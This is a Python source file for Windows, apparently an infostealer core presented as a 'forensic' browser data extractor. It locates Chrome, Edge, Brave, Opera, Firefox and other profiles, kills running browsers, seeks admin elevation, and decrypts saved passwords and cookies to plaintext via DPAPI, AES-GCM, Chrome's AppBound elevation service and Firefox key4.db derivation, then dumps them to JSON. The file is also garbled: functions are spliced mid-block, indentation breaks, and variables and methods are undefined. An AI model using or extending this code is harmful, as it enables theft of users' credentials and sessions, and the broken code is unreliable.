import os
import json
import base64
import time
import subprocess
import socket
import pathlib
import tempfile
import shutil
import platform
import random
import sqlite3
import winreg
from typing import List, Dict, Any, Optional, Tuple
from datetime import datetime, timedelta
import websocket
import requests
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
import win32crypt
import psutil
import glob
import logging
from pathlib import Path
import hashlib
import pyasn1
from pyasn1.codec.der import decoder
from pyasn1.type import univ
from pyasn1.type import namedtype
from pyasn1.type import tag
from pyasn1.type import useful
import struct
from dataclasses import dataclass
from enum import Enum
import sys
import ctypes
from ctypes import wintypes

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('browser_extractor.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

class BrowserType(Enum):
    CHROMIUM = "chromium"
    FIREFOX = "firefox"
    IE = "ie"

@dataclass
class BrowserConfig:
    name: str
    user_data: Optional[str]
    executable: Optional[str]
    type: BrowserType
    registry_paths: List[str] = None
    portable_paths: List[str] = None

# Enhanced browser configurations with registry detection paths
BROWSER_CONFIGS = {
    # Chromium-based browsers
    "chrome": BrowserConfig(
        name="Google Chrome",
        user_data=os.path.join(os.environ["LOCALAPPDATA"], "Google", "Chrome", "User Data"),
        executable=os.path.join(os.environ["PROGRAMFILES"], "Google", "Chrome", "Application", "chrome.exe"),
        type=BrowserType.CHROMIUM,
        registry_paths=[
            r"SOFTWARE\\Microsoft\Windows\\CurrentVersion\\App Paths\\chrome.exe",
            r"SOFTWARE\\Clients\\StartMenuInternet\\Google Chrome"
        ],
        portable_paths=["chrome.exe", "GoogleChromePortable.exe"]
    ),
    "edge": BrowserConfig(
        name="Microsoft Edge",
        user_data=os.path.join(os.environ["LOCALAPPDATA"], "Microsoft", "Edge", "User Data"),
        executable=os.path.join(os.environ["PROGRAMFILES(X86)"], "Microsoft", "Edge", "Application", "msedge.exe"),
        type=BrowserType.CHROMIUM,
        registry_paths=[
            r"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\msedge.exe",
            r"SOFTWARE\\Clients\\StartMenuInternet\\Microsoft Edge"
        ],
        portable_paths=["msedge.exe", "MicrosoftEdgePortable.exe"]
    ),
    "brave": BrowserConfig(
        name="Brave Browser",
        user_data=os.path.join(os.environ["LOCALAPPDATA"], "BraveSoftware", "Brave-Browser", "User Data"),
        executable=os.path.join(os.environ["PROGRAMFILES"], "BraveSoftware", "Brave-Browser", "Application", "brave.exe"),
        type=BrowserType.CHROMIUM,
        registry_paths=[
            r"SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\brave.exe",
            r"SOFTWARE\Clients\StartMenuInternet\Brave"
        ],
        portable_paths=["brave.exe", "BravePortable.exe"]
    ),
    "opera": BrowserConfig(
        name="Opera",
        user_data=os.path.join(os.environ["APPDATA"], "Opera Software", "Opera Stable"),
        executable=os.path.join(os.environ["PROGRAMFILES"], "Opera", "launcher.exe"),
        type=BrowserType.CHROMIUM,
        registry_paths=[
            r"SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\opera.exe",
            r"SOFTWARE\Clients\StartMenuInternet\Opera"
        ],
        portable_paths=["opera.exe", "OperaPortable.exe"]
    ),
    "opera_gx": BrowserConfig(
        name="Opera GX",
        user_data=os.path.join(os.environ["APPDATA"], "Opera Software", "Opera GX Stable"),
        executable=os.path.join(os.environ["PROGRAMFILES"], "Opera GX", "launcher.exe"),
        type=BrowserType.CHROMIUM,
        registry_paths=[
            r"SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\opera.exe",
            r"SOFTWARE\Clients\StartMenuInternet\Opera GX"
        ],
        portable_paths=["opera.exe", "OperaGXPortable.exe"]
    ),
    "vivaldi": BrowserConfig(
        name="Vivaldi",
        user_data=os.path.join(os.environ["LOCALAPPDATA"], "Vivaldi", "User Data"),
        executable=os.path.join(os.environ["PROGRAMFILES"], "Vivaldi", "Application", "vivaldi.exe"),
        type=BrowserType.CHROMIUM,
        registry_paths=[
            r"SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\vivaldi.exe",
            r"SOFTWARE\Clients\StartMenuInternet\Vivaldi"
        ],
        portable_paths=["vivaldi.exe", "VivaldiPortable.exe"]
    ),
    # Firefox-based browsers
    "firefox": BrowserConfig(
        name="Mozilla Firefox",
        user_data=os.path.join(os.environ["APPDATA"], "Mozilla", "Firefox", "Profiles"),
        executable=os.path.join(os.environ["PROGRAMFILES"], "Mozilla Firefox", "firefox.exe"),
        type=BrowserType.FIREFOX,
        registry_paths=[
            r"SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\firefox.exe",
            r"SOFTWARE\Clients\StartMenuInternet\FIREFOX"
        ],
        portable_paths=["firefox.exe", "FirefoxPortable.exe"]
    ),
    "tor_browser": BrowserConfig(
        name="Tor Browser",
        user_data=os.path.join(os.environ["APPDATA"], "Tor Browser", "Browser", "TorBrowser", "Data", "Browser", "profile.default"),
        executable=os.path.join(os.environ["PROGRAMFILES"], "Tor Browser", "Browser", "firefox.exe"),
        type=BrowserType.FIREFOX,
        portable_paths=["firefox.exe", "TorBrowserPortable.exe"]
    ),
    "waterfox": BrowserConfig(
        name="Waterfox",
        user_data=os.path.join(os.environ["APPDATA"], "Waterfox", "Profiles"),
        executable=os.path.join(os.environ["PROGRAMFILES"], "Waterfox", "waterfox.exe"),
        type=BrowserType.FIREFOX,
        registry_paths=[
            r"SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\waterfox.exe"
        ],
        portable_paths=["waterfox.exe"]
    ),
    # Legacy browsers
    "internet_explorer": BrowserConfig(
        name="Internet Explorer",
        user_data=None,  # Registry-based
        executable=os.path.join(os.environ["PROGRAMFILES"], "Internet Explorer", "iexplore.exe"),
        type=BrowserType.IE,
        registry_paths=[
            r"SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\iexplore.exe"
        ]
    )
}

class ExtractionError(Exception):
    """Custom exception for extraction errors"""
    pass

class BrowserDataExtractor:
    def __init__(self, custom_paths: Dict[str, str] = None):
        self.platform = platform.system()
        if self.platform != "Windows":
            raise Exception("This script is Windows-only")
        
        self.custom_paths = custom_paths or {}
        self.errors = []  # Store errors for reporting
        self.extraction_stats = {
            "browsers_processed": 0,
            "total_cookies": 0,
            "total_history": 0,
            "total_passwords": 0,
            "errors": 0
        }
        
        # Create output directory with proper structure
        self.output_base_dir = "browser_data_extraction"
        self.ensure_output_structure()
        
        # CRITICAL CHANGE: Use user profile TEMP directory for all temporary copies
        self.temp_base_path = os.path.join(os.environ['USERPROFILE'], 'TEMP')
        if not os.path.exists(self.temp_base_path):
            os.makedirs(self.temp_base_path, exist_ok=True)
        
        
        self.installed_browsers = self.detect_installed_browsers()
        
    def is_admin(self) -> bool:
        """Check if the script is running with administrator privileges"""
        try:
            return ctypes.windll.shell32.IsUserAnAdmin()
        except:
            return False
    
    def elevate_privileges(self):
        """Attempt to restart the script with elevated privileges"""
        if self.is_admin():
            return True
            
        try:
            # Get the path to the current script
            script_path = os.path.abspath(sys.argv[0])
            if not os.path.exists(script_path):
                script_path = sys.executable
                
            # Use ShellExecute to restart with elevation
            ctypes.windll.shell32.ShellExecuteW(
                None,
                "runas",  # Verb for elevation
                script_path,
                " ".join(f'"{arg}"' for arg in sys.argv),
                None,
                1  # SW_SHOWNORMAL
            )
            return False
        except Exception as e:
            logger.error(f"Failed to elevate privileges: {e}")
            return False
    
    def create_vss_snapshot(self, volume_path: str) -> Optional[str]:
        """Create a Volume Shadow Copy Service snapshot"""
        try:
            # Use vshadow.exe to create a shadow copy (more reliable than vssadmin)
            vss_cmd = f'vshadow.exe -p {volume_path}'
            result = subprocess.run(vss_cmd, shell=True, capture_output=True, text=True)
            
            if result.returncode != 0:
                logger.error(f"VSS creation failed: {result.stderr}")
                return None
                
            # Parse the output to get the shadow copy path
            for line in result.stdout.split('\n'):
                if '->' in line and ':' in line:
                    shadow_path = line.split('->')[-1].strip()
                    if os.path.exists(shadow_path):
                        return shadow_path
                        
            return None
        except Exception as e:
            logger.error(f"VSS snapshot creation failed: {e}")
            return None
    
    def detect_running_browsers(self) -> List[str]:
        """Detect running browser processes using psutil"""
        browsers_to_terminate = ["chrome.exe", "msedge.exe", "brave.exe", "opera.exe", "vivaldi.exe", "firefox.exe"]
        running_browsers = []
        
        for process in psutil.process_iter(['name']):
            try:
                if process.info['name'].lower() in [b.lower() for b in browsers_to_terminate]:
                    running_browsers.append(process.info['name'])
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                continue
        
        return list(set(running_browsers))  # Remove duplicates
    
    def terminate_browser_processes(self, browser_names: List[str]) -> bool:
        """Terminate running browser processes using psutil"""
        terminated = False
        for process in psutil.process_iter(['pid', 'name']):
            try:
                if process.info['name'].lower() in [name.lower() for name in browser_names]:
                    print(f"Terminating browser process: {process.info['name']} (PID: {process.info['pid']})")
                    process.terminate()  # Graceful termination first
                    try:
                        process.wait(timeout=5)  # Wait up to 5 seconds for graceful shutdown
                    except psutil.TimeoutExpired:
                        print(f"Force killing browser process: {process.info['name']} (PID: {process.info['pid']})")
                        process.kill()  # Force kill if graceful termination fails
                    terminated = True
                    time.sleep(1)  # Give it time to terminate
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                continue
        return terminated
    
    def ensure_output_structure(self):
        """Create the proper output directory structure: BROWSER_NAME/data_types/"""
        if not os.path.exists(self.output_base_dir):
            os.makedirs(self.output_base_dir)
            
        # Create subdirectories for each browser type
        for browser_id, config in BROWSER_CONFIGS.items():
            browser_dir = os.path.join(self.output_base_dir, config.name)
            if not os.path.exists(browser_dir):
                os.makedirs(browser_dir)
                
            # Create data type subdirectories
            data_types = ["cookies", "history", "passwords", "bookmarks", "downloads"]
            for data_type in data_types:
                data_dir = os.path.join(browser_dir, data_type)
                if not os.path.exists(data_dir):
                    os.makedirs(data_dir)
    
    def detect_installed_browsers(self) -> List[str]:
        """Enhanced browser detection using registry and file system"""
        installed = []
        
        for browser_id, config in BROWSER_CONFIGS.items():
            detected = False
            
            # Check custom paths first
            if browser_id in self.custom_paths:
                custom_path = self.custom_paths[browser_id]
                if os.path.exists(custom_path):
                    print(f"Found {config.name} at custom path: {custom_path}")
                    installed.append(browser_id)
                    # Update the config executable path
                    config.executable = custom_path
                    detected = True
                    continue
            
            # Check by executable existence
            if config.executable and os.path.exists(config.executable):
                print(f"Found {config.name} at: {config.executable}")
                installed.append(browser_id)
                detected = True
                continue
            
            # Check registry paths
            if config.registry_paths:
                for reg_path in config.registry_paths:
                    if self._check_registry_browser(reg_path):
                        print(f"Found {config.name} in registry: {reg_path}")
                        installed.append(browser_id)
                        detected = True
                        break
        
        return installed
    
    def _check_registry_browser(self, registry_path: str) -> bool:
        """Check if browser is installed via registry"""
        try:
            # Check HKEY_LOCAL_MACHINE first
            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, registry_path) as key:
                # Just checking if we can open the key is enough
                return True
        except (OSError, FileNotFoundError):
            pass
        
        try:
            # Check HKEY_CURRENT_USER
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, registry_path) as key:
                return True
        except (OSError, FileNotFoundError):
            pass
        
        return False
    
    
    def get_chromium_profiles(self, user_data_path: str) -> List[str]:
        """Get all Chromium browser profiles with enhanced detection"""
        profiles = []
        if not os.path.exists(user_data_path):
            return profiles
        
        for item in os.listdir(user_data_path):
            profile_path = os.path.join(user_data_path, item)
            if os.path.isdir(profile_path):
                # Check if this is a valid profile (has browser data)
                if (os.path.exists(os.path.join(profile_path, "Network", "Cookies")) or
                    os.path.exists(os.path.join(profile_path, "History")) or
                    os.path.exists(os.path.join(profile_path, "Login Data")) or
                    os.path.exists(os.path.join(profile_path, "Cookies"))):  # Older versions
                    profiles.append(item)
        
        return profiles
    
    def get_firefox_profiles(self, profiles_path: str) -> List[str]:
        """Get all Firefox browser profiles with enhanced detection"""
        profiles = []
        if not os.path.exists(profiles_path):
            return profiles
        
        for item in os.listdir(profiles_path):
            profile_path = os.path.join(profiles_path, item)
            if os.path.isdir(profile_path):
                # Check if this is a valid Firefox profile
                if (os.path.exists(os.path.join(profile_path, "places.sqlite")) or
                    os.path.exists(os.path.join(profile_path, "cookies.sqlite")) or
                    os.path.exists(os.path.join(profile_path, "logins.json"))):
                    profiles.append(item)
        
        return profiles
    
    def get_chromium_master_key(self, user_data_path: str) -> bytes:
        try:
            with open(local_state_path, 'r', encoding='utf-8') as f:
                local_state = json.load(f)
                
                if 'os_crypt' in local_state and 'app_bound_encrypted_key' in local_state['os_crypt']:
                    logger.info("Using AppBound encryption key (Chrome 127+)")
            
            # Get the base64-encoded AppBound key
            enc_key_b64 = local_state['os_crypt']['app_bound_encrypted_key']
            enc_key = base64.b64decode(enc_key_b64)
            
            # Decrypt using COM service
            decrypted_key = self.appbound_decryptor.decrypt_app_bound_key(local_state_path)
            
            if decrypted_key:
                # For AppBound encryption, extract the 32-byte AES key
                if len(decrypted_key) >= 32:
                    logger.info(f"Successfully decrypted AppBound key ({len(decrypted_key)} -> 32 bytes)")
                    return decrypted_key[:32]
                else:
                    logger.warning(f"AppBound key too short: {len(decrypted_key)} bytes")
                    return decrypted_key
            else:
                # Fallback to direct DPAPI if COM fails
                logger.warning("COM service failed, attempting direct DPAPI")
                try:
                    decrypted = win32crypt.CryptUnprotectData(enc_key, None, None, None, None)[1]
                    if len(decrypted) >= 32:
                        return decrypted[:32]
                    return decrypted
                except Exception as e:
                    logger.error(f"Direct DPAPI failed: {e}")
                    raise ExtractionError("AppBound key decryption failed")

        # Fallback to legacy encrypted_key
        elif 'os_crypt' in local_state and 'encrypted_key' in local_state['os_crypt']:
            logger.info("Using legacy encryption key")
            encrypted_key = local_state["os_crypt"]["encrypted_key"]
            encrypted_key = base64.b64decode(encrypted_key)
            
            # Remove DPAPI prefix
            if encrypted_key.startswith(b'DPAPI'):
                encrypted_key = encrypted_key[5:]
            
            # Decrypt with DPAPI
            decrypted = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, None)[1]
            return decrypted
        else:
            raise ExtractionError("No encryption key found in Local State")
            
    except Exception as e:
        logger.error(f"Failed to get Chromium master key: {e}")
        raise ExtractionError(f"Master key extraction failed: {e}")

                try:
                    import ctypes
                    import win32com.client
                    def decrypt_app_bound_key(local_state_path: str) -> bytes:
    """Decrypt AppBound key using GoogleChromeElevationService"""
    # Read encrypted key from Local State
    with open(local_state_path, 'r') as f:
        data = json.load(f)
    enc_key_b64 = data['os_crypt']['app_bound_encrypted_key']
    enc_key = base64.b64decode(enc_key_b64)
    
    # Access the elevation service (requires SYSTEM or Chrome folder)
    clsid = "{708860E0-F641-4611-8895-7D867DD3675B}"
    service = win32com.client.Dispatch(clsid)
    
    # Decrypt the key
    plaintext = service.DecryptData(enc_key)
    return plaintext
            
            # Fallback to legacy encrypted_key
            elif 'os_crypt' in local_state and 'encrypted_key' in local_state['os_crypt']:
                logger.info("Using legacy encryption key")
                encrypted_key = local_state["os_crypt"]["encrypted_key"]
                encrypted_key = base64.b64decode(encrypted_key)
                
                # Remove DPAPI prefix (first 5 bytes: "DPAPI")
                if encrypted_key.startswith(b'DPAPI'):
                    return encrypted_key[5:]  # Remove DPAPI prefix
                else:
                    logger.warning("No DPAPI prefix found in encrypted key")
                    return encrypted_key
            else:
                raise ExtractionError("No encryption key found in Local State")
                
        except Exception as e:
            logger.error(f"Failed to get Chromium master key: {e}")
            raise ExtractionError(f"Master key extraction failed: {e}")
    
    def decrypt_with_dpapi(self, encrypted_data: bytes) -> bytes:
        """Decrypt data using Windows DPAPI with error handling"""
        try:
            return win32crypt.CryptUnprotectData(encrypted_data, None, None, None, 0)[1]
        except Exception as e:
            logger.error(f"DPAPI decryption failed: {e}")
            raise ExtractionError(f"DPAPI decryption failed: {e}")
    
    def decrypt_chromium_value(self, encrypted_value: bytes, master_key: bytes) -> str:
    """Decrypt an encrypted Chromium browser value with AppBound v20 support"""
    if not encrypted_value:
        return ""
    
    try:
        # Check for v20 prefix (Chrome 127+ with AppBound + host hash)
        if encrypted_value[:3] == b'v20':
            nonce = encrypted_value[3:3+12]
            ciphertext = encrypted_value[3+12:-16]
            tag = encrypted_value[-16:]
            
            # Ensure master_key is exactly 32 bytes for AES-256
            if len(master_key) != 32:
                logger.warning(f"Master key length is {len(master_key)}, expected 32 bytes")
                if len(master_key) > 32:
                    master_key = master_key[:32]
                else:
                    # Pad with zeros if too short
                    master_key = master_key.ljust(32, b'\0')
            
            cipher = AES.new(master_key, AES.MODE_GCM, nonce=nonce)
            decrypted = cipher.decrypt_and_verify(ciphertext, tag)
            
            # For v20, strip the 32-byte host hash if present
            if len(decrypted) > 32:
                decrypted = decrypted[32:]
            
            plaintext = decrypted.decode('utf-8', errors='replace')
            return plaintext
        
        # Check for v10/v11 prefix (Chrome 80-126)
        elif encrypted_value[:3] in (b'v10', b'v11'):
            nonce = encrypted_value[3:3+12]
            ciphertext = encrypted_value[3+12:-16]
            tag = encrypted_value[-16:]
            
            # Ensure master_key is correct length
            if len(master_key) != 32:
                logger.warning(f"Master key length is {len(master_key)}, expected 32 bytes")
                if len(master_key) > 32:
                    master_key = master_key[:32]
                else:
                    master_key = master_key.ljust(32, b'\0')
            
            cipher = AES.new(master_key, AES.MODE_GCM, nonce=nonce)
            decrypted = cipher.decrypt_and_verify(ciphertext, tag)
            plaintext = decrypted.decode('utf-8', errors='replace')
            return plaintext
            
        # Fallback to DPAPI for older versions
        else:
            decrypted = self.appbound_decryptor._decrypt_legacy_dpapi(encrypted_value)
            plaintext = decrypted.decode('utf-8', errors='replace')
            return plaintext
                
    except Exception as e:
        logger.warning(f"Failed to decrypt Chromium value: {e}")
        # Better error reporting
        if "Incorrect AES key length" in str(e):
            return f"[DECRYPTION_FAILED:Incorrect_AES_key_length_{len(master_key)}_bytes]"
        elif len(encrypted_value) > 288:
            return f"[DECRYPTION_FAILED:AppBound_v20_key_too_large]"
        return f"[DECRYPTION_FAILED:{base64.b64encode(encrypted_value).decode()[:50]}...]"
    
    def _create_forensic_copy(self, source_path: str) -> str:
        """Create a forensic copy of the database file - MODIFIED to use copy2 and USERPROFILE TEMP"""
        try:
            # Generate hash of original file
            original_hash = self._calculate_file_hash(source_path)
            
            # CRITICAL CHANGE: Use copy2 to copy to USERPROFILE TEMP directory
            temp_path = os.path.join(self.temp_base_path, f"temp_{os.path.basename(source_path)}")
            shutil.copy2(source_path, temp_path)  # Using copy2 to preserve metadata
            return temp_path
        except Exception as e:
            logger.error(f"Failed to create forensic copy: {e}")
            raise ExtractionError(f"Forensic copy failed: {e}")
    
    def _calculate_file_hash(self, file_path: str) -> str:
        """Calculate SHA-256 hash of a file"""
        sha256_hash = hashlib.sha256()
        with open(file_path, "rb") as f:
            for chunk in iter(lambda: f.read(4096), b""):
                sha256_hash.update(chunk)
        return sha256_hash.hexdigest()
    
    def extract_chromium_cookies(self, user_data_path: str, profile: str, master_key: bytes, browser_name: str) -> List[Dict[str, Any]]:
        """Extract cookies from Chromium browser with forensic safety - ALWAYS plaintext values"""
        cookies_db_path = os.path.join(user_data_path, profile, "Network", "Cookies")
        
        # Fallback for older Chrome versions
        if not os.path.exists(cookies_db_path):
            cookies_db_path = os.path.join(user_data_path, profile, "Cookies")
        
        if not os.path.exists(cookies_db_path):
            return []
        
        temp_db_path = None
        
        try:
            # CRITICAL CHANGE: Use forensic copy with copy2 to USERPROFILE TEMP before decrypting
            temp_db_path = self._create_forensic_copy_with_vss(cookies_db_path)
            
            conn = sqlite3.connect(temp_db_path)
            cursor = conn.cursor()
            
            # Check if cookies table exists
            cursor.execute("SELECT name FROM sqlite_master WHERE type='table' AND name='cookies'")
            if not cursor.fetchone():
                logger.error("cookies table not found in database")
                return []
            
            # Get all columns to handle different Chrome versions
            cursor.execute("PRAGMA table_info(cookies)")
            columns = [row[1] for row in cursor.fetchall()]
            
            # Build query dynamically based on available columns
            query = "SELECT " + ", ".join(columns) + " FROM cookies"
            cursor.execute(query)
            
            cookies = []
            for row in cursor.fetchall():
                row_dict = dict(zip(columns, row))
                
                if not row_dict.get("name") or not row_dict.get("host_key"):
                    continue
                
                # ALWAYS decrypt to plaintext, never return empty/black values
                decrypted_value = self.decrypt_chromium_value(row_dict.get("encrypted_value", b""), master_key)
                
                cookie = {
                    "host_key": row_dict.get("host_key", ""),
                    "name": row_dict.get("name", ""),
                    "path": row_dict.get("path", ""),
                    "value": decrypted_value,  # Always plaintext
                    "expires_utc": row_dict.get("expires_utc", 0),
                    "is_secure": bool(row_dict.get("is_secure", 0)),
                    "is_httponly": bool(row_dict.get("is_httponly", 0)),
                    "creation_utc": row_dict.get("creation_utc", 0),
                    "last_access_utc": row_dict.get("last_access_utc", 0),
                    "has_expires": bool(row_dict.get("has_expires", 0)),
                    "is_persistent": bool(row_dict.get("is_persistent", 0)),
                    "priority": row_dict.get("priority", 0),
                    "samesite": row_dict.get("samesite", -1),
                    "source_scheme": row_dict.get("source_scheme", 0),
                    "source_port": row_dict.get("source_port", 0)
                }
                
                cookies.append(cookie)
            
            cursor.close()
            conn.close()
            
            # Save to structured output directory
            output_file = os.path.join(self.output_base_dir, browser_name, "cookies", f"{profile}_cookies.json")
            with open(output_file, "w", encoding="utf-8") as f:
                json.dump(cookies, f, indent=2, default=str)

            return cookies
        
        except Exception as e:
            logger.error(f"Failed to extract Chromium cookies: {e}")
            self.errors.append(f"Chromium cookies extraction failed: {e}")
            return []
    
    def extract_chromium_history(self, user_data_path: str, profile: str, browser_name: str) -> List[Dict[str, Any]]:
        """Extract history from Chromium browser with forensic safety"""
        history_db_path = os.path.join(user_data_path, profile, "History")
        
        if not os.path.exists(history_db_path):
            return []
        
        temp_db_path = None
        
        try:
            # CRITICAL CHANGE: Use forensic copy with copy2 to USERPROFILE TEMP before decrypting
            temp_db_path = self._create_forensic_copy_with_vss(history_db_path)
            
            conn = sqlite3.connect(temp_db_path)
            cursor = conn.cursor()
            
            cursor.execute("""
                SELECT urls.url, urls.title, urls.visit_count, urls.typed_count, urls.last_visit_time,
                       visits.visit_time, visits.from_visit, visits.transition
                FROM visits
                JOIN urls ON visits.url = urls.id
                ORDER BY visits.visit_time DESC
            """)
            
            history = []
            for row in cursor.fetchall():
                url, title, visit_count, typed_count, last_visit_time, \
                visit_time, from_visit, transition = row
                
                history_entry = {
                    "url": url,
                    "title": title,
                    "visit_count": visit_count,
                    "typed_count": typed_count,
                    "last_visit_time": self.chrome_time_to_datetime(last_visit_time),
                    "visit_time": self.chrome_time_to_datetime(visit_time),
                    "from_visit": from_visit,
                    "transition": transition
                }
                
                history.append(history_entry)
            
            cursor.close()
            conn.close()
            
            # Save to structured output directory
            output_file = os.path.join(self.output_base_dir, browser_name, "history", f"{profile}_history.json")
            with open(output_file, "w", encoding="utf-8") as f:
                json.dump(history, f, indent=2, default=str)
            
            return history
        
        except Exception as e:
            logger.error(f"Failed to extract Chromium history: {e}")
            self.errors.append(f"Chromium history extraction failed: {e}")
            return []
        
        finally:
            # Clean up temporary copy
            try:
                if temp_db_path and os.path.exists(temp_db_path):
                    os.remove(temp_db_path)
                    logger.debug(f"Cleaned up temporary copy: {temp_db_path}")
            except:
                pass
    
    def extract_chromium_passwords(self, user_data_path: str, profile: str, master_key: bytes, browser_name: str) -> List[Dict[str, Any]]:
        """Extract passwords from Chromium browser with forensic safety - ALWAYS plaintext passwords"""
        login_db_path = os.path.join(user_data_path, profile, "Login Data")
        
        if not os.path.exists(login_db_path):
            return []
        
        temp_db_path = None
        
        try:
            # CRITICAL CHANGE: Use forensic copy with copy2 to USERPROFILE TEMP before decrypting
            temp_db_path = self._create_forensic_copy_with_vss(login_db_path)
            
            conn = sqlite3.connect(temp_db_path)
            cursor = conn.cursor()
            
            cursor.execute("""
                SELECT origin_url, action_url, username_value, password_value,
                       date_created, date_last_used, blacklisted_by_user, times_used
                FROM logins
            """)
            
            passwords = []
            for row in cursor.fetchall():
                origin_url, action_url, username_value, encrypted_password, \
                date_created, date_last_used, blacklisted_by_user, times_used = row
                
                # ALWAYS decrypt to plaintext, never base64 or empty
                decrypted_password = self.decrypt_chromium_value(encrypted_password, master_key)
                
                password_entry = {
                    "origin_url": origin_url,
                    "action_url": action_url,
                    "username_value": username_value,
                    "password_value": decrypted_password,  # Always plaintext
                    "date_created": self.chrome_time_to_datetime(date_created),
                    "date_last_used": self.chrome_time_to_datetime(date_last_used),
                    "blacklisted_by_user": bool(blacklisted_by_user),
                    "times_used": times_used
                }
                
                passwords.append(password_entry)
            
            cursor.close()
            conn.close()
            
            # Save to structured output directory
            output_file = os.path.join(self.output_base_dir, browser_name, "passwords", f"{profile}_passwords.json")
            with open(output_file, "w", encoding="utf-8") as f:
                json.dump(passwords, f, indent=2, default=str)
            
            return passwords
        
        except Exception as e:
            logger.error(f"Failed to extract Chromium passwords: {e}")
            self.errors.append(f"Chromium passwords extraction failed: {e}")
            return []
        except:
            pass
    
    def extract_chromium_bookmarks(self, user_data_path: str, profile: str, browser_name: str) -> List[Dict[str, Any]]:
        """Extract bookmarks from Chromium browser"""
        bookmarks_path = os.path.join(user_data_path, profile, "Bookmarks")
        
        if not os.path.exists(bookmarks_path):
            return []
        
        try:
            # CRITICAL CHANGE: Use copy2 to copy bookmarks file to USERPROFILE TEMP before reading
            temp_bookmarks_path = os.path.join(self.temp_base_path, f"temp_bookmarks_{profile}.json")
            shutil.copy2(bookmarks_path, temp_bookmarks_path)  # Using copy2 to preserve metadata
            
            with open(temp_bookmarks_path, 'r', encoding='utf-8') as f:
                bookmarks_data = json.load(f)
            
            bookmarks = []
            
            def extract_bookmark_folder(folder, folder_name=""):
                if isinstance(folder, dict):
                    if "children" in folder:
                        for child in folder["children"]:
                            extract_bookmark_folder(child, folder.get("name", folder_name))
                    elif "url" in folder:
                        bookmark = {
                            "name": folder.get("name", ""),
                            "url": folder.get("url", ""),
                            "date_added": folder.get("date_added", 0),
                            "date_modified": folder.get("date_modified", 0),
                            "folder": folder_name
                        }
                        bookmarks.append(bookmark)
            
            # Extract from bookmark bar and other folders
            if "roots" in bookmarks_data:
                for root_key, root_value in bookmarks_data["roots"].items():
                    extract_bookmark_folder(root_value, root_key)
            
            # Save to structured output directory
            output_file = os.path.join(self.output_base_dir, browser_name, "bookmarks", f"{profile}_bookmarks.json")
            with open(output_file, "w", encoding="utf-8") as f:
                json.dump(bookmarks, f, indent=2, default=str)
            
            return bookmarks
        
        except Exception as e:
            logger.error(f"Failed to extract Chromium bookmarks: {e}")
            self.errors.append(f"Chromium bookmarks extraction failed: {e}")
            return []
        
        finally:
            # Clean up temporary copy
            try:
                temp_bookmarks_path = os.path.join(self.temp_base_path, f"temp_bookmarks_{profile}.json")
                if os.path.exists(temp_bookmarks_path):
                    os.remove(temp_bookmarks_path)
                    logger.debug(f"Cleaned up temporary bookmarks copy: {temp_bookmarks_path}")
            except:
                pass
        def extract_firefox_master_key(self, profile_path: str, master_password: str = "") -> Optional[bytes]:
    """Extract Firefox master key from key4.db (modern) or key3.db (legacy)"""
    key4_db_path = os.path.join(profile_path, "key4.db")
    key3_db_path = os.path.join(profile_path, "key3.db")
    temp_key4_path = None

    try:
        if os.path.exists(key4_db_path):
            # CRITICAL CHANGE: Use copy2 to copy key4.db to USERPROFILE TEMP before decrypting
            temp_key4_path = os.path.join(self.temp_base_path, f"temp_key4.db")
            shutil.copy2(key4_db_path, temp_key4_path)

            conn = sqlite3.connect(temp_key4_path)
            cursor = conn.cursor()

            cursor.execute("SELECT item1, item2 FROM metadata WHERE id = 'password-check'")
            result = cursor.fetchone()
            if not result:
                return None
            global_salt, item2 = result

            decoded, _ = decoder.decode(item2)
            entry_salt = bytes(decoded[0][1][0])
            encrypted_value = bytes(decoded[1])

            key = self._derive_nss_key(global_salt, entry_salt, master_password)

            iv = encrypted_value[:8]
            ciphertext = encrypted_value[8:-24]
            cipher = self._create_3des_cipher(key, iv)
            decrypted = cipher.decrypt(ciphertext)

            if decrypted.endswith(b'password-check'):
                cursor.execute("SELECT item1, item2 FROM metadata WHERE id = 'private-key'")
                result = cursor.fetchone()
                if result:
                    _, private_key_data = result
                    decoded, _ = decoder.decode(private_key_data)
                    master_key_entry = decoded[1][0][1]
                    master_key_salt = bytes(master_key_entry[0][1][0])
                    master_key_encrypted = bytes(master_key_entry[1])

                    master_key = self._derive_nss_key(global_salt, master_key_salt, master_password)
                    iv = master_key_encrypted[:8]
                    ciphertext = master_key_encrypted[8:-24]
                    cipher = self._create_3des_cipher(master_key, iv)
                    master_key_decrypted = cipher.decrypt(ciphertext)

                    return master_key_decrypted

            cursor.close()
            conn.close()

        elif os.path.exists(key3_db_path):
            # Fallback to legacy key3.db
            return self._extract_master_key_key3(key3_db_path, master_password)

    except Exception as e:
        logger.error(f"Failed to extract Firefox master key: {e}")
        self.errors.append(f"Firefox master key extraction failed: {e}")

    finally:
        try:
            if temp_key4_path and os.path.exists(temp_key4_path):
                os.remove(temp_key4_path)
                logger.debug(f"Cleaned up temporary key4 copy: {temp_key4_path}")
        except:
            pass

    return None


def _derive_nss_key(self, global_salt: bytes, entry_salt: bytes, master_password: str) -> bytes:
    """Derive NSS decryption key"""
    import hashlib
    import hmac

    hp = hashlib.sha1(global_salt + master_password.encode()).digest()
    pes = entry_salt + b'\x00' * (20 - len(entry_salt))
    k1 = hmac.new(hp, pes, hashlib.sha1).digest()
    tk = hmac.new(hp, k1 + entry_salt, hashlib.sha1).digest()
    if len(tk) < 24:
        k2 = hmac.new(hp, k1, hashlib.sha1).digest()
        tk += k2
    return tk[:24]


def _create_3des_cipher(self, key: bytes, iv: bytes):
    """Create 3DES cipher for NSS decryption"""
    from Crypto.Cipher import DES3
    return DES3.new(key, DES3.MODE_CBC, iv)


